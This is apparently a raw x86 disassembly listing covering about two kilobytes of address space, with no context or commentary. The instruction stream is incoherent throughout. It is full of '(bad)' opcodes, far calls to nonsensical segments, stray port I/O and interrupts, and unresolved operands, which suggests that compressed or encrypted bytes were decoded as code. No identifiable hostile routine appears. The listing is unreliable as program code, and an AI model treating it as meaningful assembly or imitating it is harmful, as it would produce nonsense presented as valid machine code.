  4069e8:	repnz call FWORD PTR cs:[ecx-0x47]
  4069ed:	(bad)  
  4069ee:	cli    
  4069ef:	push   ds
  4069f0:	add    edi,DWORD PTR [esi+0x43]
  4069f3:	sbb    al,0xb1
  4069f5:	and    DWORD PTR [ebx-0x3b54e09d],ebp
  4069fb:	mov    esi,0xb0f1145e
  406a00:	cdq    
  406a01:	sub    BYTE PTR [edi],dh
  406a03:	ins    DWORD PTR es:[edi],dx
  406a04:	adc    eax,0xcc4cc637
  406a09:	push   es
  406a0a:	and    dh,0x7a
  406a0d:	inc    edi
  406a0e:	jb     0x406a44
  406a10:	add    eax,0x276e9bd1
  406a15:	and    DWORD PTR [ebp-0x30c365b6],eax
  406a1b:	gs sti 
  406a1d:	push   ebx
  406a1e:	mov    esi,DWORD PTR [ebp+0x7aede886]
  406a24:	adc    bl,al
  406a26:	jp     0x406a85
  406a28:	shl    DWORD PTR [ebp+0x19],0x54
  406a2c:	inc    ebp
  406a2d:	(bad)  
  406a2e:	es iret 
  406a30:	iret   
  406a31:	mov    eax,0x2fcb2f2f
  406a36:	or     eax,0x6d5c1811
  406a3b:	call   0x3a5:0x7d26dde8
  406a42:	repz mov ch,0x4b
  406a45:	fisttp DWORD PTR [ebx-0x1e]
  406a48:	(bad)  
  406a49:	adc    al,0x69
  406a4b:	xchg   edi,eax
  406a4c:	ds aad 0x98
  406a4f:	sbb    BYTE PTR [eax+0x416c1a79],0x18
  406a56:	es daa 
  406a58:	push   esp
  406a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a5a:	(bad)
  406a5d:	dec    ebp
  406a5e:	mov    ebx,0x95b39347
  406a63:	push   0x5bc669c4
  406a68:	add    BYTE PTR [edi-0x58ee33b3],dl
  406a6e:	neg    cl
  406a70:	movhlps xmm2,xmm2
  406a73:	test   esp,ebx
  406a75:	js     0x406abd
  406a77:	push   0x15
  406a79:	lds    ecx,FWORD PTR [edx+0x44]
  406a7c:	sub    BYTE PTR [edi-0xc],bh
  406a7f:	test   BYTE PTR [eax+0x2c],al
  406a82:	aam    0xca
  406a84:	dec    edi
  406a85:	(bad)  
  406a86:	push   0xa2a2ec21
  406a8b:	cmp    al,0x18
  406a8d:	adc    DWORD PTR [esi+0x36fabde4],esi
  406a93:	shl    BYTE PTR [ebp-0x80],1
  406a96:	pop    ecx
  406a97:	scas   al,BYTE PTR es:[edi]
  406a98:	ds mov eax,0x8bf0d674
  406a9e:	push   esp
  406a9f:	shl    BYTE PTR [edi+0x42ed2e05],1
  406aa5:	inc    ecx
  406aa6:	out    dx,al
  406aa7:	mov    ah,0x3c
  406aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406aaa:	ds jge 0x406a56
  406aad:	jmp    0x8b280f76
  406ab2:	inc    eax
  406ab3:	out    0xe5,eax
  406ab5:	push   0x23cd5ef5
  406aba:	fwait
  406abb:	lock mov bl,0x2e
  406abe:	daa    
  406abf:	dec    eax
  406ac0:	ds or  eax,0xa80b5f20
  406ac6:	in     eax,dx
  406ac7:	xor    DWORD PTR [edi+0x7357a578],esi
  406acd:	cmp    edi,ebp
  406acf:	inc    ebx
  406ad0:	cmc    
  406ad1:	inc    ebx
  406ad2:	adc    ebp,0x121b3ad2
  406ad8:	ja     0x406acb
  406ada:	xor    eax,0x9de6cc10
  406adf:	sbb    bh,ch
  406ae1:	pop    esp
  406ae2:	imul   ecx,ebp,0x4b
  406ae5:	pop    esi
  406ae6:	cld    
  406ae7:	jl     0x406b0e
  406ae9:	cwde   
  406aea:	jg     0x406b05
  406aec:	call   0x2646:0x1cc64190
  406af3:	sbb    DWORD PTR [bx+si+0x7e],eax
  406af7:	jge    0x406b14
  406af9:	cmp    DWORD PTR [edi-0x4e],esp
  406afc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406afd:	sub    al,0xfc
  406aff:	xor    eax,0x3ec219f5
  406b04:	aaa    
  406b05:	sbb    BYTE PTR [ecx+0x17],dl
  406b08:	lock add DWORD PTR [ecx-0x70],edx
  406b0c:	dec    edi
  406b0d:	loope  0x406b34
  406b0f:	xchg   BYTE PTR [esi+0x38],bh
  406b12:	sub    bl,BYTE PTR [ecx-0x67]
  406b15:	inc    ebx
  406b16:	sahf   
  406b17:	clc    
  406b18:	inc    ebp
  406b19:	fisubr DWORD PTR [eax-0x68]
  406b1c:	ja     0x406af4
  406b1e:	fistp  DWORD PTR [esi+0x77]
  406b21:	mov    bl,0xfa
  406b23:	pop    edi
  406b24:	int3   
  406b25:	int    0x87
  406b27:	ins    BYTE PTR es:[edi],dx
  406b28:	add    eax,ebp
  406b2a:	je     0x406b5a
  406b2c:	dec    eax
  406b2d:	inc    edi
  406b2e:	jp     0x406b12
  406b30:	gs js  0x406b59
  406b33:	inc    ebx
  406b34:	dec    ebx
  406b35:	inc    esi
  406b36:	push   ds
  406b37:	dec    edi
  406b38:	push   ebx
  406b39:	popa   
  406b3a:	xchg   BYTE PTR [edi-0x31d08906],dl
  406b40:	je     0x406b1e
  406b42:	scas   eax,DWORD PTR es:[edi]
  406b43:	mov    DWORD PTR ss:[ecx+esi*2+0x5b305b3a],ecx
  406b4b:	ror    DWORD PTR [edx+0x27],0x73
  406b4f:	div    eax
  406b51:	arpl   WORD PTR [edi],di
  406b53:	ja     0x406bb2
  406b55:	scas   al,BYTE PTR es:[edi]
  406b56:	sbb    esi,DWORD PTR [edx+0x7598dd26]
  406b5c:	xchg   ecx,eax
  406b5d:	in     eax,dx
  406b5e:	xchg   esp,eax
  406b5f:	bound  esp,QWORD PTR [ebp+0x1130f885]
  406b65:	xchg   ebp,eax
  406b66:	outs   dx,DWORD PTR ds:[esi]
  406b67:	cdq    
  406b68:	add    al,0xab
  406b6b:	and    bl,0xc7
  406b6e:	mov    cl,0x4
  406b70:	ret    
  406b71:	(bad)  
  406b73:	push   ecx
  406b74:	loope  0x406b3e
  406b76:	push   ecx
  406b77:	mov    BYTE PTR ds:0x22d11cd6,cl
  406b7d:	test   BYTE PTR [eax+ecx*1-0x3307b760],bh
  406b84:	and    al,0x4a
  406b86:	sti    
  406b87:	mov    ebx,0x85c60dba
  406b8c:	mov    BYTE PTR [eax+0x62dac540],dh
  406b92:	je     0x406bcd
  406b94:	std    
  406b95:	mov    WORD PTR [ebp+0x3b],cs
  406b98:	in     al,0xe
  406b9a:	das    
  406b9b:	(bad)  
  406b9c:	aam    0xdd
  406b9e:	ja     0x406bfc
  406ba0:	and    bl,BYTE PTR [edi]
  406ba2:	push   ecx
  406ba3:	shr    BYTE PTR [esi+0x1c],0x1a
  406ba7:	and    al,BYTE PTR [eax+0x63014cd4]
  406bad:	jne    0x406bc9
  406baf:	and    eax,edx
  406bb1:	arpl   sp,ax
  406bb3:	arpl   WORD PTR [edi],di
  406bb5:	dec    ebp
  406bb6:	push   edx
  406bb7:	cli    
  406bb8:	push   0xffffffee
  406bba:	inc    eax
  406bbb:	dec    ebx
  406bbc:	sbb    al,0x7e
  406bbe:	jo     0x406ba1
  406bc0:	retf   
  406bc1:	daa    
  406bc2:	or     al,0xad
  406bc4:	retf   0x7380
  406bc7:	int3   
  406bc8:	std    
  406bc9:	pushf  
  406bca:	mov    ch,0xdb
  406bcc:	fcom   QWORD PTR [ebx+0x54]
  406bcf:	inc    edx
  406bd0:	shl    DWORD PTR [edx+0x6c4698bc],cl
  406bd6:	xor    bh,BYTE PTR [ebx+edx*2-0x51]
  406bda:	test   al,0x66
  406bdc:	mov    dl,0x46
  406bde:	cs loop 0x406c42
  406be1:	nop
  406be2:	std    
  406be3:	cmp    eax,0x75f94f84
  406be8:	fstp   TBYTE PTR [ecx-0x2e]
  406beb:	(bad)  
  406bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bed:	loopne 0x406c02
  406bef:	mov    esp,0x3eae1102
  406bf4:	mov    DWORD PTR [eax-0x4a],ebp
  406bf7:	adc    DWORD PTR [si+0x634c],ecx
  406bfc:	sub    DWORD PTR [edx],ecx
  406bfe:	xor    DWORD PTR [edx+esi*2+0xf364c93],ebx
  406c05:	push   edx
  406c06:	sub    bh,BYTE PTR [ebx-0x5676a0f]
  406c0c:	and    edx,ecx
  406c0e:	add    ecx,DWORD PTR [eax+0x77]
  406c11:	dec    ebx
  406c12:	mov    bl,0x1a
  406c14:	mov    esp,0x6c203e14
  406c19:	popa   
  406c1a:	pop    eax
  406c1b:	jmp    0x6c9e8262
  406c20:	inc    ebp
  406c21:	popa   
  406c22:	xchg   ecx,ecx
  406c24:	mov    dh,0x67
  406c26:	push   ebp
  406c27:	arpl   WORD PTR [edi-0x4b],cx
  406c2a:	call   0x493291d8
  406c2f:	lock imul edi,DWORD PTR [edx-0x6f],0xffffffb2
  406c34:	fimul  WORD PTR [edx+0x52eb8b19]
  406c3a:	dec    edx
  406c3b:	pop    ss
  406c3c:	gs cmc 
  406c3e:	cli    
  406c3f:	lock push ecx
  406c41:	aaa    
  406c42:	ret    0xe88f
  406c45:	dec    ecx
  406c46:	push   cs
  406c47:	push   cs
  406c48:	adc    edi,0x181c37c0
  406c4e:	repz and ah,BYTE PTR ds:[ebp+0x24]
  406c53:	bound  esp,QWORD PTR [edi+edx*8]
  406c56:	mov    esi,0x7e828d4
  406c5b:	leave  
  406c5c:	push   ds
  406c5d:	cdq    
  406c5e:	inc    ebp
  406c5f:	sbb    DWORD PTR ds:0xb5879b69,esp
  406c65:	mov    ds:0x596c13dc,al
  406c6a:	cmp    al,0x69
  406c6c:	ins    DWORD PTR es:[edi],dx
  406c6d:	ror    BYTE PTR [esi+ebp*2],0xc0
  406c71:	adc    esp,DWORD PTR [esi+eiz*1+0x3]
  406c75:	sbb    ecx,ecx
  406c77:	dec    esi
  406c78:	outs   dx,BYTE PTR ds:[esi]
  406c79:	cdq    
  406c7a:	sub    al,0x79
  406c7c:	jnp    0x406c7e
  406c7e:	and    ebx,DWORD PTR [edi+0x3]
  406c81:	xor    eax,0xf8a8dbc7
  406c86:	je     0x406c86
  406c88:	nop
  406c89:	aas    
  406c8a:	pop    edi
  406c8b:	adc    DWORD PTR [esi+0x5b],ecx
  406c8e:	pop    esi
  406c8f:	fstp   TBYTE PTR [ecx+0x51fd5754]
  406c95:	lods   eax,DWORD PTR ds:[esi]
  406c96:	xor    al,0x96
  406c98:	mov    esi,DWORD PTR [edi+0x3b1e39d0]
  406c9e:	cmp    BYTE PTR [ebp+0x1d40f616],0x42
  406ca5:	imul   edx,ebx,0x38382b46
  406cab:	sub    al,0x7b
  406cad:	stos   DWORD PTR es:[edi],eax
  406cae:	fwait
  406caf:	push   es
  406cb0:	int    0x80
  406cb2:	stc    
  406cb3:	sbb    ch,al
  406cb5:	icebp  
  406cb6:	div    bh
  406cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cb9:	sub    edi,DWORD PTR [ecx-0x53]
  406cbc:	cmc    
  406cbd:	add    al,BYTE PTR [edx]
  406cbf:	out    dx,al
  406cc0:	mov    ecx,0x17cb656d
  406cc5:	or     edi,DWORD PTR [esi]
  406cc7:	sub    edi,DWORD PTR [edi+0x54a1982a]
  406ccd:	rcr    BYTE PTR [edi-0x78],cl
  406cd0:	mov    ch,bl
  406cd2:	sti    
  406cd3:	aaa    
  406cd4:	(bad)  
  406cd5:	push   esi
  406cd6:	stc    
  406cd7:	gs push edi
  406cd9:	mov    esp,0x85a2e481
  406cde:	fwait
  406cdf:	xchg   esi,eax
  406ce0:	push   ss
  406ce1:	sub    ecx,DWORD PTR [edx]
  406ce3:	stc    
  406ce4:	test   eax,0xadf649c1
  406ce9:	jmp    0x406d40
  406ceb:	jle    0x406c77
  406ced:	xor    al,0xab
  406cef:	add    ch,BYTE PTR [ecx-0x60]
  406cf2:	sub    BYTE PTR [ebx],cl
  406cf4:	dec    eax
  406cf5:	test   DWORD PTR [ebx-0x125224a9],ebp
  406cfb:	sbb    al,0x4a
  406cfd:	int    0x9f
  406cff:	sti    
  406d00:	push   ebp
  406d01:	(bad)  
  406d02:	ror    bl,1
  406d04:	sub    DWORD PTR [esi-0x2f5fc0f2],0x67
  406d0b:	popf   
  406d0c:	mov    es,WORD PTR [ebp+0x300f737b]
  406d12:	pop    ds
  406d13:	ret    
  406d14:	in     al,0xf
  406d16:	sti    
  406d17:	addr16 mov ah,0x42
  406d1a:	pop    ds
  406d1b:	rol    DWORD PTR [ebx],0x9f
  406d1e:	dec    ecx
  406d1f:	sub    esi,ecx
  406d21:	(bad)  
  406d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d23:	or     DWORD PTR [ebp-0xe883e1c],edx
  406d29:	mov    DWORD PTR [ecx],eax
  406d2b:	push   ss
  406d2c:	jb     0x406d36
  406d2e:	push   0x5d
  406d30:	aad    0x95
  406d32:	jnp    0x406d34
  406d34:	test   eax,0x2a8d4580
  406d39:	out    0xd0,al
  406d3b:	in     eax,0xe1
  406d3d:	sti    
  406d3e:	lock add bl,BYTE PTR [esi-0x6c83959f]
  406d45:	cmp    DWORD PTR [esi+ebp*4+0x12380257],esi
  406d4c:	(bad)  
  406d4e:	pop    edx
  406d4f:	fild   WORD PTR [edx]
  406d51:	enter  0xf0e6,0x4e
  406d55:	scas   al,BYTE PTR es:[edi]
  406d56:	fidiv  DWORD PTR [eax-0xea69105]
  406d5c:	into   
  406d5d:	test   BYTE PTR [edx],dh
  406d5f:	mov    esi,0x30bd95f8
  406d64:	repnz or eax,0xf1af1aab
  406d6a:	and    cl,BYTE PTR fs:[esi+0x3e]
  406d6e:	aam    0xae
  406d70:	push   cs
  406d71:	sahf   
  406d72:	push   edx
  406d73:	sub    eax,0xfb67bbbc
  406d78:	push   esi
  406d79:	push   esp
  406d7a:	mov    ecx,0x5b496bc
  406d7f:	inc    edx
  406d80:	cmp    eax,0xcdfd172e
  406d85:	aad    0x60
  406d87:	sub    eax,0x8c49f403
  406d8c:	mov    esi,0xa37952cf
  406d91:	ins    BYTE PTR es:[edi],dx
  406d92:	(bad)  
  406d93:	fdiv   st(7),st
  406d95:	nop
  406d96:	mov    ah,0x7a
  406d98:	daa    
  406d99:	mov    cs,WORD PTR [eax+ebx*4]
  406d9c:	mov    al,0x1
  406d9e:	push   ebx
  406d9f:	ficom  DWORD PTR [edi+0x25033ecb]
  406da5:	shl    DWORD PTR [esi+0x55ef77ae],1
  406dab:	adc    ah,BYTE PTR [ebp+ecx*2+0x2e]
  406daf:	outs   dx,DWORD PTR ds:[esi]
  406db0:	dec    edx
  406db1:	push   es
  406db2:	test   DWORD PTR [esi-0x52],eax
  406db5:	add    al,0xd1
  406db7:	sti    
  406db8:	pop    esp
  406db9:	sub    DWORD PTR [edi-0x3d],eax
  406dbc:	push   ds
  406dbd:	pop    ss
  406dbe:	out    0xd1,al
  406dc0:	in     eax,0xa9
  406dc2:	retf   
  406dc3:	mov    bh,0x81
  406dc5:	stos   BYTE PTR es:[edi],al
  406dc6:	jmp    0x930ccdcc
  406dcb:	cld    
  406dcc:	lods   eax,DWORD PTR ds:[esi]
  406dcd:	int    0xa6
  406dcf:	xor    cl,BYTE PTR [eax*8+0x30aed865]
  406dd6:	jbe    0x406dbe
  406dd8:	mov    ebp,0x79b6fa05
  406ddd:	add    bh,BYTE PTR [ecx]
  406ddf:	fimul  DWORD PTR ds:0x520e17b0
  406de5:	dec    ecx
  406de6:	xor    ebp,esp
  406de8:	outs   dx,BYTE PTR ds:[esi]
  406de9:	push   ecx
  406dea:	icebp  
  406deb:	or     eax,0xaf4f94f4
  406df0:	ret    0x881a
  406df3:	push   ebx
  406df4:	test   al,0x98
  406df6:	leave  
  406df7:	retf   0xfd74
  406dfa:	xchg   edi,eax
  406dfb:	jno    0x406d98
  406dfd:	sub    cl,BYTE PTR [ebx+ecx*2-0x6a]
  406e01:	sub    DWORD PTR [esi-0xb],edx
  406e04:	xchg   edi,eax
  406e05:	lds    esi,FWORD PTR [eax-0x53]
  406e08:	fdiv   QWORD PTR [edx]
  406e0a:	das    
  406e0b:	je     0x406dfa
  406e0d:	in     al,0x3f
  406e0f:	mov    al,0xb8
  406e11:	imul   ecx,edx,0xffffffff
  406e14:	inc    ebx
  406e15:	mov    eax,ds:0xae880d4e
  406e1a:	adc    edx,DWORD PTR [esi-0x521ef182]
  406e20:	stc    
  406e21:	cmp    al,al
  406e23:	jecxz  0x406dde
  406e25:	jmp    0x9de3:0x98e62c09
  406e2c:	mov    bl,0xd0
  406e2e:	in     al,dx
  406e2f:	mov    edi,0x6c88ab6e
  406e34:	mov    eax,ds:0x9ed545cc
  406e39:	jle    0x406e30
  406e3b:	test   al,0x9f
  406e3d:	mov    ebp,0xd49e8161
  406e42:	mov    fs,WORD PTR [eax]
  406e44:	mov    eax,0x2576dd7d
  406e49:	(bad)  [edi]
  406e4b:	sbb    DWORD PTR [esi-0x187ea9a7],ebp
  406e51:	xchg   edx,eax
  406e52:	push   ss
  406e53:	ins    BYTE PTR es:[edi],dx
  406e54:	sbb    dl,BYTE PTR [ecx-0x53]
  406e57:	sub    eax,0xcc203fa9
  406e5c:	dec    ebp
  406e5d:	push   ecx
  406e5e:	test   al,0x63
  406e60:	add    ebp,esi
  406e62:	pusha  
  406e63:	jne    0x406e0d
  406e65:	push   eax
  406e66:	xchg   edi,eax
  406e67:	inc    eax
  406e68:	and    BYTE PTR [edx+0x44],dh
  406e6b:	pop    ss
  406e6c:	into   
  406e6d:	rcl    DWORD PTR [eax+0x66],0x1d
  406e71:	push   0xa2d62dc9
  406e76:	mov    eax,0x74d42638
  406e7b:	enter  0xe000,0x6c
  406e7f:	call   0x9b37:0xc3ba3126
  406e86:	into   
  406e87:	or     eax,0x53db1c6d
  406e8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e8d:	lods   al,BYTE PTR ds:[esi]
  406e8e:	or     al,0x8c
  406e90:	push   ds
  406e91:	mov    ebp,0xcfdf7a6d
  406e96:	jmp    DWORD PTR [edx+eiz*1-0x42f7fcd4]
  406e9d:	pop    ebx
  406e9e:	lods   al,BYTE PTR ds:[esi]
  406e9f:	call   0x6ad4:0x23881c7f
  406ea6:	push   ss
  406ea7:	es pop es
  406ea9:	(bad)  [ecx]
  406eab:	cmp    al,0x12
  406ead:	mov    bl,0x62
  406eaf:	mov    cl,BYTE PTR [eax]
  406eb1:	cli    
  406eb2:	icebp  
  406eb3:	pop    ebp
  406eb4:	push   0x9ead1e84
  406eb9:	repz sub al,0x5e
  406ebc:	stos   DWORD PTR es:[edi],eax
  406ebd:	std    
  406ebe:	push   ds
  406ebf:	mov    bl,0x42
  406ec1:	cwde   
  406ec2:	sub    cl,ah
  406ec4:	sbb    DWORD PTR [esi-0x3b370829],edi
  406eca:	sbb    al,0xc0
  406ecc:	push   ebp
  406ecd:	test   cl,cl
  406ecf:	imul   ecx,DWORD PTR [edx],0x5f
  406ed2:	(bad)  
  406ed3:	fldenv [edx-0x2cb99861]
  406ed9:	inc    ecx
  406eda:	jecxz  0x406ec5
  406edc:	and    DWORD PTR [edx+esi*8],edi
  406edf:	jp     0x406ef1
  406ee1:	cmp    bl,BYTE PTR [ebx]
  406ee3:	stos   DWORD PTR es:[edi],eax
  406ee4:	mov    bl,0xc6
  406ee6:	lock cli 
  406ee8:	and    DWORD PTR [ebx+0x1ba0f701],esp
  406eee:	or     dl,cl
  406ef0:	leave  
  406ef1:	xchg   esp,eax
  406ef2:	sub    ah,dh
  406ef4:	dec    edi
  406ef5:	and    cl,BYTE PTR [edi]
  406ef7:	dec    esp
  406ef8:	retf   
  406ef9:	mul    esp
  406efb:	jnp    0x406f3f
  406efd:	push   0xb9fb4d7e
  406f02:	arpl   WORD PTR [ebp-0x57a2377],bp
  406f08:	ins    DWORD PTR es:[edi],dx
  406f09:	mov    bl,0xe7
  406f0b:	test   BYTE PTR [ebx+0x43250e27],0x8f
  406f12:	mov    DWORD PTR [si+0x38],esi
  406f16:	mov    ds:0x60772464,al
  406f1b:	or     ecx,DWORD PTR [edx+0x37]
  406f1e:	push   0x60f28e84
  406f23:	xor    al,0x40
  406f25:	jnp    0x406eeb
  406f27:	outs   dx,BYTE PTR ds:[esi]
  406f28:	in     al,dx
  406f29:	dec    esp
  406f2a:	add    esp,DWORD PTR [edi-0x271183f6]
  406f30:	imul   BYTE PTR [eax-0x1b6536e9]
  406f36:	out    0xf1,eax
  406f38:	jecxz  0x406eea
  406f3a:	(bad)  
  406f3b:	xchg   ebp,eax
  406f3c:	dec    ebx
  406f3d:	xchg   al,dl
  406f3f:	pop    ds
  406f40:	add    al,0xc0
  406f42:	add    al,0xa6
  406f44:	dec    ecx
  406f45:	aad    0x6f
  406f47:	popf   
  406f48:	dec    edi
  406f49:	pop    ss
  406f4a:	xchg   edi,eax
  406f4b:	dec    eax
  406f4c:	pop    es
  406f4d:	sbb    DWORD PTR [ecx],esi
  406f4f:	aam    0xd5
  406f51:	lahf   
  406f52:	mov    al,ds:0x6fac8621
  406f57:	jecxz  0x406f24
  406f59:	loopne 0x406f28
  406f5b:	xchg   ebx,eax
  406f5c:	inc    esi
  406f5d:	push   edx
  406f5e:	push   es
  406f5f:	dec    ebp
  406f60:	xor    ebp,DWORD PTR [edx]
  406f62:	mov    dl,0x6c
  406f64:	pop    eax
  406f65:	jno    0x406f20
  406f67:	in     al,dx
  406f68:	test   BYTE PTR [edx+0x7d],0x27
  406f6c:	or     BYTE PTR [eax+0x7ae1b7bc],al
  406f72:	test   eax,0x99af72ad
  406f77:	mov    ?,WORD PTR [ebp+0x53]
  406f7a:	js     0x406fd5
  406f7c:	cmp    al,0x2b
  406f7e:	or     DWORD PTR [edi+0x10],ebp
  406f81:	in     al,0xf9
  406f83:	mov    ch,0x67
  406f85:	dec    ecx
  406f86:	add    dl,dl
  406f88:	fnsave [edx-0x65f1f5cc]
  406f8e:	jmp    0xe47c5209
  406f93:	(bad)  
  406f94:	rcl    esi,0xb6
  406f97:	rol    edx,1
  406f99:	js     0x406f8a
  406f9b:	fld    QWORD PTR [ecx]
  406f9d:	push   ss
  406f9e:	sub    ah,BYTE PTR [esi]
  406fa0:	jl     0x406f61
  406fa2:	ins    BYTE PTR es:[edi],dx
  406fa3:	xlat   BYTE PTR ds:[ebx]
  406fa4:	xchg   DWORD PTR [ebx-0x260257dc],edi
  406faa:	mov    ds:0x68309526,eax
  406faf:	std    
  406fb0:	mov    al,0xaf
  406fb2:	push   cs
  406fb3:	retf   
  406fb4:	push   ds
  406fb5:	mov    dh,0xb3
  406fb7:	test   DWORD PTR [edi+0xc],ecx
  406fba:	push   ebx
  406fbb:	push   0xffffff80
  406fbd:	lods   al,BYTE PTR ds:[esi]
  406fbe:	hlt    
  406fbf:	pushf  
  406fc0:	std    
  406fc1:	push   ebx
  406fc2:	jmp    0x406fc2
  406fc4:	xor    al,0x97
  406fc6:	bound  eax,QWORD PTR [edx+0x4bcf5957]
  406fcc:	mov    edi,0xcb1ad2fe
  406fd1:	and    BYTE PTR [edi+0x1e78dabb],bh
  406fd7:	mov    al,0xd2
  406fd9:	push   ebp
  406fda:	cmp    ebx,DWORD PTR [ebp+0x26]
  406fdd:	sbb    DWORD PTR [ecx],ecx
  406fdf:	mov    WORD PTR [esi],es
  406fe1:	mov    dh,0xf0
  406fe3:	(bad)  
  406fe4:	jmp    0x4aaf4d79
  406fe9:	sub    ah,BYTE PTR [eax+0x6d6c10b9]
  406fef:	mov    eax,0xcf10b028
  406ff4:	pusha  
  406ff5:	or     DWORD PTR [ebp-0x7b],esp
  406ff8:	lods   al,BYTE PTR ds:[esi]
  406ff9:	sbb    eax,ebx
  406ffb:	cmp    ebx,DWORD PTR [esi+0x18]
  406ffe:	jns    0x407059
  407000:	cld    
  407001:	cmp    DWORD PTR [eax+0x4f69a6a6],0x5979f33a
  40700b:	push   edx
  40700c:	mov    edi,0xa8052d81
  407011:	jmpw   0xefe5
  407015:	leave  
  407016:	imul   ecx,DWORD PTR [edx+0x3fe51b08],0xa4b67d21
  407020:	and    al,0x5b
  407022:	pusha  
  407023:	sbb    al,BYTE PTR [eax]
  407025:	scas   al,BYTE PTR es:[edi]
  407026:	scas   eax,DWORD PTR es:[edi]
  407027:	push   0xdb8b3606
  40702c:	mov    cl,0x2c
  40702e:	fcomp  QWORD PTR [edi-0x45]
  407031:	add    eax,0xd2236a6
  407036:	push   esi
  407037:	call   0xb778:0xdb7d8d97
  40703e:	jno    0x40705d
  407040:	mov    bl,0x94
  407042:	aaa    
  407043:	pop    es
  407044:	mov    eax,0xb22a2a6c
  407049:	push   es
  40704a:	pop    eax
  40704b:	jmp    0x407085
  40704d:	leave  
  40704e:	in     eax,0x78
  407050:	push   edi
  407051:	push   eax
  407052:	xchg   BYTE PTR ds:0xccb85abc,bl
  407058:	fisub  DWORD PTR [eax]
  40705a:	mov    ecx,0x6f744d2d
  40705f:	cmp    al,0xa
  407061:	mov    ebp,0x78533249
  407066:	lock mov ebx,0xbbb4ee4d
  40706c:	xchg   edi,eax
  40706d:	leave  
  40706e:	fidivr WORD PTR [edx-0x74]
  407071:	xchg   edi,eax
  407072:	(bad)  
  407074:	(bad)  
  407075:	sub    al,0x2e
  407077:	das    
  407078:	or     BYTE PTR [esi-0x70ccca59],0x7e
  40707f:	adc    bl,0xe1
  407082:	lds    edi,FWORD PTR [esi-0x38]
  407085:	mov    eax,ds:0x9ca7676a
  40708a:	inc    esi
  40708b:	cdq    
  40708c:	cmp    eax,esp
  40708e:	(bad)  
  40708f:	xchg   ebp,eax
  407090:	adc    eax,0x68c07ee8
  407095:	xchg   esp,eax
  407096:	adc    al,0x8b
  407098:	and    BYTE PTR [edi-0x2e],0xd8
  40709c:	mov    al,0x8a
  40709e:	in     al,dx
  40709f:	jae    0x407043
  4070a1:	iret   
  4070a2:	or     DWORD PTR [eax],esi
  4070a4:	sbb    ah,dl
  4070a6:	mov    ss,WORD PTR [eax+0x1b]
  4070a9:	mov    dh,0x26
  4070ab:	sub    eax,0x52434eb
  4070b0:	retf   0x487
  4070b3:	pop    ecx
  4070b4:	js     0x407052
  4070b6:	cs mov bl,0x3b
  4070b9:	neg    DWORD PTR [ebp-0x1f]
  4070bc:	mov    ebp,0x27dd42bb
  4070c1:	mov    bl,ah
  4070c3:	adc    eax,0xf02b94de
  4070c8:	in     al,dx
  4070c9:	inc    edx
  4070ca:	add    bl,BYTE PTR [eax-0x17]
  4070cd:	mov    al,ds:0xf5940be8
  4070d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070d3:	inc    esi
  4070d4:	jno    0x4070fa
  4070d6:	test   BYTE PTR [ebp+0x61bdd96b],ah
  4070dc:	mov    ecx,0x7363cf7a
  4070e1:	adc    eax,0xcb01e892
  4070e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070e7:	xor    cl,BYTE PTR [ebx-0x44ab1937]
  4070ed:	sbb    al,dl
  4070ef:	mov    ah,0xc1
  4070f1:	js     0x407121
  4070f3:	mov    dh,0x4f
  4070f5:	adc    DWORD PTR [esi-0x66432a8],0xfffffff2
  4070fc:	inc    esp
  4070fd:	sbb    DWORD PTR [esi-0x337dabe5],ebx
  407103:	lock xchg DWORD PTR [ebx],esp
  407106:	nop
  407107:	cwde   
  407108:	repnz fmul QWORD PTR [ebx-0x3a]
  40710c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40710d:	inc    edi
  40710e:	mov    BYTE PTR [edi-0x36802be4],al
  407114:	dec    eax
  407115:	or     ecx,DWORD PTR [ebx+0xc55223f]
  40711b:	xchg   edx,ebx
  40711d:	and    al,0x4e
  40711f:	lods   al,BYTE PTR ds:[esi]
  407120:	mov    esi,esi
  407122:	retf   0x14fc
  407125:	xor    ecx,DWORD PTR [edx]
  407127:	xchg   ebx,eax
  407128:	fist   WORD PTR [ecx+ecx*1-0x66]
  40712c:	and    al,0x1c
  40712e:	cwde   
  40712f:	sbb    bl,BYTE PTR [edx+0x32]
  407132:	xchg   DWORD PTR [eax],edx
  407134:	xor    al,0xca
  407136:	push   ecx
  407137:	jae    0x40713f
  407139:	add    DWORD PTR [edx],ecx
  40713b:	jg     0x4070cc
  40713d:	mov    bh,0x12
  40713f:	adc    esi,DWORD PTR [ebp+ecx*2+0x2dc7921]
  407146:	out    dx,al
  407147:	mov    dl,0xd3
  407149:	sub    edx,DWORD PTR [ebp+0x1f]
  40714c:	bound  esi,QWORD PTR [ebx]
  40714e:	mov    ah,0x51
  407150:	ror    BYTE PTR [edx*1+0x4eeba9ad],1
  407157:	dec    eax
  407158:	shl    DWORD PTR [ecx-0x10],cl
  40715b:	stos   DWORD PTR es:[edi],eax
  40715c:	adc    al,0x3e
  40715e:	push   eax
  40715f:	cmp    eax,0x15cf87ee
  407164:	pop    edi
  407165:	ss ja  0x407122
  407168:	jo     0x4071c1
  40716a:	jno    0x4071dc
  40716c:	lea    edi,[eax-0x4c]
  40716f:	pop    edx
  407170:	enter  0x5630,0x72
  407174:	out    0x36,eax
  407176:	das    
  407177:	xchg   edx,eax
  407178:	mov    edx,0x8511abdb
  40717d:	ret    0x7a48
  407180:	popf   
  407181:	xor    eax,0x11d1ff8f
  407186:	dec    DWORD PTR [ebx]
  407188:	xlat   BYTE PTR ds:[ebx]
  407189:	cmc    
  40718a:	test   BYTE PTR [ebx-0x39],al
  40718d:	jg     0x4071e6
  40718f:	jmp    FWORD PTR gs:[ebp+0x5b5f72ac]
  407196:	mov    ebx,cs
  407198:	xchg   edx,eax
  407199:	test   eax,0x4583242
  40719e:	push   esi
  40719f:	mov    edi,edx
  4071a1:	mov    edi,0x8a23fee7
  4071a6:	mov    ?,WORD PTR [ecx-0x7b96cb94]
  4071ac:	adc    eax,0xbc16a3f2
  4071b1:	pusha  
  4071b2:	ret    
